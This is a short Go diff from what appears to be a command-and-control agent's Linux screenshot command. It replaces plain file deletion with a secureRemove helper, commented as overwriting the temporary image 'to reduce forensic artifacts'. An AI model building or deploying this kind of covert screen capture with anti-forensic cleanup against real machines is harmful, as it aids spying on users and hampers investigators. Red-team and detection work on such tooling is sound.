@@ -58,19 +58,19 @@ func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResul
 	}
 
 	if err != nil {
-		os.Remove(tmpFile)
+		secureRemove(tmpFile)
 		return errorf("Screenshot failed: %v\nEnsure a screenshot tool is installed (import/scrot/gnome-screenshot for X11, grim for Wayland)", err)
 	}
 
 	// Read the screenshot file
 	imgData, err := os.ReadFile(tmpFile)
 	if err != nil {
-		os.Remove(tmpFile)
+		secureRemove(tmpFile)
 		return errorf("Error reading screenshot file: %v", err)
 	}
 
-	// Clean up temp file
-	os.Remove(tmpFile)
+	// Clean up temp file — overwrite before removal to reduce forensic artifacts
+	secureRemove(tmpFile)
 
 	if len(imgData) == 0 {
 		return errorResult("Screenshot captured but file was empty (no display available?)")
